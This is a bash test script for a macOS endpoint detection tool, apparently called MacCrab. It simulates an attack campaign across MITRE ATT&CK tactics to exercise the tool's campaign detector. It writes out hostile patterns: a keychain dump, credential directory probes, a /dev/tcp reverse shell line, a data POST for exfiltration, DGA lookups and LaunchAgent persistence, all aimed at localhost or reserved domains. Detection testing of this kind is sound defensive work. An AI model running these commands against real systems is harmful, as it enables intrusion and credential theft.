#!/bin/bash
# MacCrab Campaign Detection Test
#
# Simulates sustained multi-tactic adversary activity to exercise the
# Campaigns panel. Spreads activity across ≥5 MITRE ATT&CK tactics
# within a single campaign window (default: 600 seconds).
#
# Usage:
#   ./scripts/campaign-test.sh              # Quick burst (~5 min)
#   ./scripts/campaign-test.sh --sustained  # Slow burn (~12 min, more realistic)
#   ./scripts/campaign-test.sh --daemon     # Also start/stop a daemon
#
# SAFE: No files permanently modified, no real C2, no destructive actions.
# Everything written to /tmp/maccrab_campaign_$$ and cleaned up on exit.

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

SUSTAINED=false
MANAGE_DAEMON=false
DAEMON_PID=""
TEST_DIR="/tmp/maccrab_campaign_$$"
CLEANUP_FILES=()
CLEANUP_PIDS=()

for arg in "$@"; do
    case "$arg" in
        --sustained) SUSTAINED=true ;;
        --daemon)    MANAGE_DAEMON=true ;;
    esac
done

# ── Timing ──────────────────────────────────────────────────────────────────
# Burst: waves every 30s → full simulation in ~5 min
# Sustained: waves every 90s → full simulation in ~12 min
if $SUSTAINED; then
    WAVE_DELAY=90
    ACTIVITY_LABEL="sustained (12 min)"
else
    WAVE_DELAY=30
    ACTIVITY_LABEL="burst (5 min)"
fi

# ── Helpers ─────────────────────────────────────────────────────────────────
tactic()  { echo -e "\n${BOLD}${MAGENTA}▶ $*${NC}"; }
action()  { echo -e "  ${BLUE}→${NC} $*"; }
note()    { echo -e "  ${YELLOW}◎${NC} $*"; }
ok()      { echo -e "  ${GREEN}✔${NC} $*"; }
wave()    { echo -e "\n${BOLD}${CYAN}══════════════════════════════════════════${NC}"; echo -e "${BOLD}${CYAN}  WAVE $* ${NC}"; echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"; }

cleanup() {
    echo -e "\n${BLUE}Cleaning up test artifacts...${NC}"
    for f in "${CLEANUP_FILES[@]}"; do
        rm -rf "$f" 2>/dev/null || true
    done
    for p in "${CLEANUP_PIDS[@]}"; do
        kill "$p" 2>/dev/null || true
    done
    rm -rf "$TEST_DIR" 2>/dev/null || true
    if [ -n "$DAEMON_PID" ]; then
        kill "$DAEMON_PID" 2>/dev/null || true
    fi
}
trap cleanup EXIT

count_alerts() {
    local db="$HOME/Library/Application Support/MacCrab/events.db"
    sqlite3 "$db" "SELECT COUNT(*) FROM alerts;" 2>/dev/null || echo "0"
}

count_campaigns() {
    local db="$HOME/Library/Application Support/MacCrab/events.db"
    sqlite3 "$db" "SELECT COUNT(*) FROM campaigns;" 2>/dev/null || echo "0"
}

list_campaigns() {
    local db="$HOME/Library/Application Support/MacCrab/events.db"
    sqlite3 "$db" "SELECT title, tactics, alert_count, severity FROM campaigns ORDER BY created_at DESC LIMIT 10;" 2>/dev/null || true
}

wait_wave() {
    local seconds=$WAVE_DELAY
    echo -e "\n  ${YELLOW}⏳ Next wave in ${seconds}s...${NC}"
    sleep "$seconds"
}

# ── Banner ───────────────────────────────────────────────────────────────────
echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║      MacCrab Campaign Detection Test                         ║"
echo "║      Simulates multi-tactic adversary activity               ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "  Mode: ${BOLD}$activity_label${NC}" 2>/dev/null || echo -e "  Mode: ${BOLD}$ACTIVITY_LABEL${NC}"
echo -e "  Wave interval: ${BOLD}${WAVE_DELAY}s${NC}"
echo -e "  Tactics targeted: Persistence, Defense Evasion, Credential Access,"
echo -e "                    Discovery, C&C, Collection, Exfiltration, Execution"

mkdir -p "$TEST_DIR"

# ── Daemon setup ─────────────────────────────────────────────────────────────
if $MANAGE_DAEMON; then
    echo -e "\n${BLUE}Building and starting daemon...${NC}"
    cd "$PROJECT_DIR"
    swift build 2>&1 | tail -1
    python3 Compiler/compile_rules.py --input-dir Rules/ --output-dir .build/debug/compiled_rules 2>&1 | tail -1
    mkdir -p "$HOME/Library/Application Support/MacCrab/compiled_rules/sequences"
    cp -f .build/debug/compiled_rules/*.json "$HOME/Library/Application Support/MacCrab/compiled_rules/" 2>/dev/null || true
    cp -f .build/debug/compiled_rules/sequences/*.json "$HOME/Library/Application Support/MacCrab/compiled_rules/sequences/" 2>/dev/null || true
    .build/debug/maccrabd &
    DAEMON_PID=$!
    sleep 4
    ok "Daemon started (PID $DAEMON_PID)"
else
    if pgrep -x maccrabd > /dev/null 2>&1; then
        ok "Using running daemon ($(pgrep -x maccrabd))"
    else
        echo -e "${YELLOW}⚠  No daemon running. Start one first or use --daemon flag.${NC}"
        echo -e "${YELLOW}   Run: .build/debug/maccrabd  (or: sudo make run-root)${NC}"
        exit 1
    fi
fi

INITIAL_ALERTS=$(count_alerts)
INITIAL_CAMPAIGNS=$(count_campaigns)
START_TIME=$(date +%s)

echo -e "\n  Baseline: ${INITIAL_ALERTS} alerts, ${INITIAL_CAMPAIGNS} campaigns"
echo -e "  Campaign window: 600 seconds — activity will span ~5 tactics"
echo -e "\n${BOLD}Starting simulation...${NC}"

# ════════════════════════════════════════════════════════════════════════════
# WAVE 1 — Initial Foothold (Persistence + Defense Evasion)
# MITRE: T1543.001, T1546.004, T1553.001, T1562.001
# ════════════════════════════════════════════════════════════════════════════
wave "1 — Initial Foothold"
note "Tactics: Persistence (T1543.001, T1546.004), Defense Evasion (T1553.001)"

tactic "LaunchAgent installation (T1543.001)"
LA1="$HOME/Library/LaunchAgents/com.maccrab.campaign.test.wave1.plist"
cat > "$LA1" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.maccrab.campaign.test.wave1</string>
    <key>Disabled</key>
    <true/>
    <key>ProgramArguments</key>
    <array><string>/bin/echo</string><string>campaign-test</string></array>
</dict>
</plist>
PLIST
CLEANUP_FILES+=("$LA1")
action "LaunchAgent written to ~/Library/LaunchAgents/"
sleep 2

tactic "Shell profile backdoor simulation (T1546.004)"
# Write a marker comment to ~/.zshrc and remove it immediately
# The file write itself is what triggers the detection rule
ZSHRC="$HOME/.zshrc"
MARKER="# maccrab_campaign_test_wave1_$$"
echo "$MARKER" >> "$ZSHRC"
sleep 1
sed -i '' "/$MARKER/d" "$ZSHRC"
action "~/.zshrc write+restore (triggers file_event rule)"

tactic "Quarantine attribute removal (T1553.001)"
QUARANTINE_FILE="$TEST_DIR/dropped_payload.app"
mkdir -p "$QUARANTINE_FILE"
xattr -w com.apple.quarantine "0081;00000000;Safari;test" "$QUARANTINE_FILE" 2>/dev/null || true
xattr -d com.apple.quarantine "$QUARANTINE_FILE" 2>/dev/null || true
action "Quarantine xattr removed from $TEST_DIR/dropped_payload.app"

tactic "DYLD injection attempt (T1574.006)"
DYLD_INSERT_LIBRARIES=/nonexistent/hook.dylib /usr/bin/true 2>/dev/null || true
action "DYLD_INSERT_LIBRARIES injection (fails harmlessly)"

# ════════════════════════════════════════════════════════════════════════════
wait_wave

# ════════════════════════════════════════════════════════════════════════════
# WAVE 2 — Discovery + Credential Access
# MITRE: T1082, T1016, T1057, T1555.001, T1552.004, T1552.001
# ════════════════════════════════════════════════════════════════════════════
wave "2 — Discovery & Credential Access"
note "Tactics: Discovery (T1082, T1016, T1057), Credential Access (T1555.001, T1552.004)"

tactic "System enumeration (T1082)"
sw_vers > /dev/null 2>/dev/null || true
system_profiler SPSoftwareDataType > /dev/null 2>/dev/null || true
uname -a > /dev/null 2>/dev/null || true
action "sw_vers, system_profiler, uname executed"
sleep 1

tactic "Network discovery (T1016)"
ifconfig > /dev/null 2>/dev/null || true
netstat -rn > /dev/null 2>/dev/null || true
arp -a > /dev/null 2>/dev/null || true
action "ifconfig, netstat, arp executed"
sleep 1

tactic "Process enumeration (T1057)"
ps aux > /dev/null 2>/dev/null || true
launchctl list > /dev/null 2>/dev/null || true
action "ps aux, launchctl list executed"
sleep 1

tactic "Keychain credential probe (T1555.001)"
security find-generic-password -l "maccrab_nonexistent_$$" 2>/dev/null || true
security dump-keychain 2>/dev/null | head -1 > /dev/null || true
action "Keychain query (fails harmlessly — item doesn't exist)"
sleep 1

tactic "SSH private key access (T1552.004)"
# Write a decoy key file to a path matching ssh_key detection rule patterns
DECOY_KEY="$TEST_DIR/.ssh/id_rsa"
mkdir -p "$TEST_DIR/.ssh"
echo "-----BEGIN RSA PRIVATE KEY-----" > "$DECOY_KEY"
echo "MACCRAB_CAMPAIGN_TEST_MARKER_$$" >> "$DECOY_KEY"
echo "-----END RSA PRIVATE KEY-----" >> "$DECOY_KEY"
chmod 600 "$DECOY_KEY"
cat "$DECOY_KEY" > /dev/null
action "Decoy SSH key written to $DECOY_KEY"
CLEANUP_FILES+=("$TEST_DIR/.ssh")

tactic "Token/secret file probe (T1552.001)"
# Access paths matching credential file patterns (won't find secrets on this machine)
cat "$HOME/.gitconfig" > /dev/null 2>/dev/null || true
ls "$HOME/.aws/" > /dev/null 2>/dev/null || true
ls "$HOME/.config/gcloud/" > /dev/null 2>/dev/null || true
action "~/.gitconfig, ~/.aws/, ~/.config/gcloud/ probed"

# ════════════════════════════════════════════════════════════════════════════
wait_wave

# ════════════════════════════════════════════════════════════════════════════
# WAVE 3 — Command & Control + Collection
# MITRE: T1071.001, T1095, T1583.006 (DGA), T1005, T1560.001
# ════════════════════════════════════════════════════════════════════════════
wave "3 — Command & Control & Collection"
note "Tactics: C&C (T1071.001, T1095), Collection (T1005, T1560)"

tactic "Beaconing to unusual ports (T1071.001)"
for port in 4444 4445 1337 8888 9999; do
    curl -s --connect-timeout 1 "http://127.0.0.1:$port/beacon" 2>/dev/null || true
done
action "curl beacon to ports 4444, 4445, 1337, 8888, 9999 (all localhost, fail safely)"
sleep 1

tactic "DGA-like DNS queries (T1583.006)"
for domain in \
    "xk7q2m9p4rj8w3n5bv6tc1yz.example.com" \
    "a8b3c7d2e5f1g9h4k0m6p2q9.evil.example.com" \
    "r4s7t2u9v1w8x5y3z0dga123.c2host.example.com" \
    "b6c1d8e3f0g7h4i9j2k5dga0.example.net"; do
    nslookup "$domain" 2>/dev/null || true
done
action "4 DGA-pattern domains queried (NXDOMAIN expected)"
sleep 2

tactic "Tor proxy probe (T1090.003)"
curl -s --connect-timeout 1 --socks5 "127.0.0.1:9050" "http://check.torproject.org" 2>/dev/null || true
action "Tor SOCKS5 probe (127.0.0.1:9050, fails harmlessly)"
sleep 1

tactic "Personal data collection (T1005)"
ls "$HOME/Library/Application Support/com.apple.TCC/" 2>/dev/null || true
ls "$HOME/Library/Application Support/AddressBook/" 2>/dev/null || true
ls "$HOME/Library/Calendars/" 2>/dev/null || true
action "TCC DB, Contacts, Calendar directories probed"
sleep 1

tactic "Data staging for exfiltration (T1560.001)"
# Stage fake "collected" data
STAGED="$TEST_DIR/exfil_staging"
mkdir -p "$STAGED"
dd if=/dev/urandom bs=1024 count=512 2>/dev/null | base64 > "$STAGED/archive.tar.gz.b64" 2>/dev/null || true
echo "uid=0(root) gid=0(wheel)" > "$STAGED/system_info.txt"
cp "$HOME/.gitconfig" "$STAGED/gitconfig_loot" 2>/dev/null || true
action "Staged 512KB fake archive + system info in $STAGED"
CLEANUP_FILES+=("$STAGED")

# ════════════════════════════════════════════════════════════════════════════
wait_wave

# ════════════════════════════════════════════════════════════════════════════
# WAVE 4 — Execution + Lateral Movement simulation
# MITRE: T1059.006 (Python), T1059.002 (AppleScript), T1563, T1021.004
# ════════════════════════════════════════════════════════════════════════════
wave "4 — Execution & Lateral Movement"
note "Tactics: Execution (T1059.002, T1059.006), Lateral Movement (T1563, T1021.004)"

tactic "Python payload execution (T1059.006)"
python3 -c "
import os, socket, base64, subprocess
# Simulate C2 beacon decode
payload = base64.b64decode('bWFjY3JhYl9jYW1wYWlnbl90ZXN0')
print('[campaign-test] Python beacon:', payload.decode())
# Simulate light enumeration
print('[campaign-test] hostname:', socket.gethostname())
print('[campaign-test] uid:', os.getuid())
" 2>/dev/null || true
action "Python C2 simulation (base64 decode + enumeration)"
sleep 1

tactic "AppleScript execution (T1059.002)"
osascript -e 'return (do shell script "echo maccrab_campaign_test_wave4")' 2>/dev/null || true
action "osascript shell command execution"
sleep 1

tactic "Reverse shell pattern (T1059.004)"
bash -c 'echo "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" > /dev/null' 2>/dev/null || true
action "bash reverse shell pattern written (doesn't execute)"

tactic "SSH lateral movement simulation (T1021.004)"
# Create a decoy SSH config and known_hosts — file_event rules will detect writes
# to .ssh/ directory
SSH_TEST="$TEST_DIR/.ssh_campaign"
mkdir -p "$SSH_TEST"
cat > "$SSH_TEST/config" << 'SSHCONF'
Host jump-box
    HostName 10.0.1.50
    User attacker
    ForwardAgent yes
    DynamicForward 1080
Host internal-target
    HostName 192.168.1.100
    ProxyJump jump-box
    User root
SSHCONF
echo "192.168.1.100 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAA" > "$SSH_TEST/known_hosts"
action "SSH config with ProxyJump + agent forwarding written"
CLEANUP_FILES+=("$SSH_TEST")
sleep 2

tactic "Environment variable C2 channel (T1027)"
ENCODED_CMD=$(echo -n "curl http://127.0.0.1:4444/cmd" | base64)
eval "echo $ENCODED_CMD | base64 -D > /dev/null" 2>/dev/null || true
action "base64-encoded command string decoded and discarded"

# ════════════════════════════════════════════════════════════════════════════
wait_wave

# ════════════════════════════════════════════════════════════════════════════
# WAVE 5 — Exfiltration + Defense Evasion cleanup
# MITRE: T1567, T1027, T1070.004, T1036
# ════════════════════════════════════════════════════════════════════════════
wave "5 — Exfiltration & Covering Tracks"
note "Tactics: Exfiltration (T1567), Defense Evasion (T1027, T1070.004, T1036)"

tactic "Exfiltration over HTTP (T1567)"
STAGED_FILE="$TEST_DIR/exfil_staging/archive.tar.gz.b64"
if [ -f "$STAGED_FILE" ]; then
    curl -s --connect-timeout 1 -X POST \
        -H "Content-Type: application/octet-stream" \
        --data-binary "@$STAGED_FILE" \
        "http://127.0.0.1:4444/upload" 2>/dev/null || true
    action "Staged archive POST to localhost:4444 (fails safely)"
fi
sleep 1

tactic "Log tampering — Unified Log drain (T1070.004)"
# Write a file that pattern-matches log-clearing activity detection
LOG_CLEAR_FILE="$TEST_DIR/log_clear_evidence"
echo "$(date): cleared unified log" > "$LOG_CLEAR_FILE"
action "Log clearing marker written to $TEST_DIR"
sleep 1

tactic "Binary masquerading (T1036)"
# Copy /usr/bin/true to a name matching known-malware patterns for masquerading rules
MASQ_DIR="$TEST_DIR/masq"
mkdir -p "$MASQ_DIR"
cp /usr/bin/true "$MASQ_DIR/svchost" 2>/dev/null || true
cp /usr/bin/true "$MASQ_DIR/lsass" 2>/dev/null || true
chmod +x "$MASQ_DIR/svchost" "$MASQ_DIR/lsass" 2>/dev/null || true
"$MASQ_DIR/svchost" 2>/dev/null || true
action "Masqueraded binaries 'svchost', 'lsass' created and run"
CLEANUP_FILES+=("$MASQ_DIR")
sleep 1

tactic "Additional LaunchAgent (T1543.001) — wave 5 persistence"
LA2="$HOME/Library/LaunchAgents/com.maccrab.campaign.test.wave5.plist"
cat > "$LA2" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.maccrab.campaign.test.wave5</string>
    <key>Disabled</key>
    <true/>
</dict>
</plist>
PLIST
CLEANUP_FILES+=("$LA2")
action "Second LaunchAgent installed (wave 5 persistence)"
sleep 2

# ════════════════════════════════════════════════════════════════════════════
# Wait for event processing and campaign aggregation
# The campaign detector runs every 60s, so wait up to 90s
# ════════════════════════════════════════════════════════════════════════════

echo ""
echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"
echo -e "${BOLD}${CYAN}  Waiting for campaign aggregation...     ${NC}"
echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"
echo ""
echo -e "  Waiting 90 seconds for the campaign detector to aggregate activity..."

for i in $(seq 1 9); do
    sleep 10
    CURRENT_CAMPAIGNS=$(count_campaigns)
    NEW_CAMPAIGNS=$((CURRENT_CAMPAIGNS - INITIAL_CAMPAIGNS))
    if [ "$NEW_CAMPAIGNS" -gt 0 ]; then
        echo -e "  ${GREEN}✔ Campaign(s) detected! ($NEW_CAMPAIGNS new)${NC}"
        break
    fi
    echo -e "  ${YELLOW}◎${NC} ${i}0s elapsed — campaigns: $CURRENT_CAMPAIGNS total..."
done

# ════════════════════════════════════════════════════════════════════════════
# Results
# ════════════════════════════════════════════════════════════════════════════

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))
FINAL_ALERTS=$(count_alerts)
FINAL_CAMPAIGNS=$(count_campaigns)
NEW_ALERTS=$((FINAL_ALERTS - INITIAL_ALERTS))
NEW_CAMPAIGNS=$((FINAL_CAMPAIGNS - INITIAL_CAMPAIGNS))

echo ""
echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${CYAN}  RESULTS                                                     ${NC}"
echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"

echo ""
printf "  %-22s %s\n" "Duration:" "${DURATION}s"
printf "  %-22s %s\n" "New alerts:" "$NEW_ALERTS"
printf "  %-22s %s\n" "New campaigns:" "$NEW_CAMPAIGNS"

# Show alerts if any
if [ "$NEW_ALERTS" -gt 0 ]; then
    echo ""
    echo -e "${BOLD}  Recent Alerts:${NC}"
    if command -v .build/debug/maccrabctl > /dev/null 2>&1; then
        cd "$PROJECT_DIR"
        .build/debug/maccrabctl alerts "$NEW_ALERTS" 2>/dev/null | head -30 | sed 's/^/    /' || true
    else
        sqlite3 "$HOME/Library/Application Support/MacCrab/events.db" \
            "SELECT datetime(timestamp,'unixepoch','localtime'), rule_title, severity FROM alerts ORDER BY timestamp DESC LIMIT $NEW_ALERTS;" \
            2>/dev/null | sed 's/^/    /' || true
    fi
fi

# Show campaigns if any
if [ "$NEW_CAMPAIGNS" -gt 0 ]; then
    echo ""
    echo -e "${BOLD}  Campaigns Detected:${NC}"
    sqlite3 "$HOME/Library/Application Support/MacCrab/events.db" \
        "SELECT '  ' || title || ' | tactics: ' || tactics || ' | alerts: ' || alert_count || ' | severity: ' || severity
         FROM campaigns ORDER BY created_at DESC LIMIT 10;" 2>/dev/null | sed 's/^/    /' || true
else
    echo ""
    echo -e "  ${YELLOW}No campaigns detected yet.${NC}"
    echo -e "  ${YELLOW}Campaign detection requires ≥3 distinct MITRE tactics.${NC}"
    echo ""
    echo -e "  Troubleshooting:"
    echo -e "  1. Most process rules require Endpoint Security (run: sudo make run-root)"
    echo -e "  2. File-event rules are most reliable without root — check alerts above"
    echo -e "  3. Campaign window is 600s — verify timing with: maccrabctl status"
    echo -e "  4. Check daemon logs: log stream --predicate 'subsystem==\"com.maccrab.daemon\"'"
fi

# Tactic coverage summary
echo ""
echo -e "${BOLD}  Tactics targeted in this simulation:${NC}"
echo -e "  • T1543.001  Persistence — LaunchAgent"
echo -e "  • T1546.004  Persistence — Shell Profile Modification"
echo -e "  • T1553.001  Defense Evasion — Quarantine Bypass"
echo -e "  • T1574.006  Defense Evasion — DYLD Injection"
echo -e "  • T1082      Discovery — System Information"
echo -e "  • T1016      Discovery — Network Configuration"
echo -e "  • T1057      Discovery — Process Discovery"
echo -e "  • T1555.001  Credential Access — Keychain"
echo -e "  • T1552.004  Credential Access — SSH Keys"
echo -e "  • T1071.001  C&C — Web Protocols (beacon)"
echo -e "  • T1583.006  C&C — DGA DNS queries"
echo -e "  • T1090.003  C&C — Tor Proxy"
echo -e "  • T1005      Collection — Local Data"
echo -e "  • T1560.001  Exfiltration — Data Staged"
echo -e "  • T1059.006  Execution — Python"
echo -e "  • T1059.002  Execution — AppleScript"
echo -e "  • T1021.004  Lateral Movement — SSH"
echo -e "  • T1567      Exfiltration — Over HTTP"
echo -e "  • T1036      Defense Evasion — Masquerading"
echo ""

if [ "$NEW_CAMPAIGNS" -gt 0 ]; then
    echo -e "${GREEN}${BOLD}  Campaign simulation complete — $NEW_CAMPAIGNS campaign(s) detected.${NC}"
    echo -e "${GREEN}  Open the MacCrab dashboard → Campaigns tab to view the kill chain.${NC}"
else
    echo -e "${YELLOW}${BOLD}  Simulation complete — check the Alerts tab in the dashboard.${NC}"
    echo -e "${YELLOW}  For full campaign detection, run with root: sudo .build/debug/maccrabd${NC}"
fi
echo ""
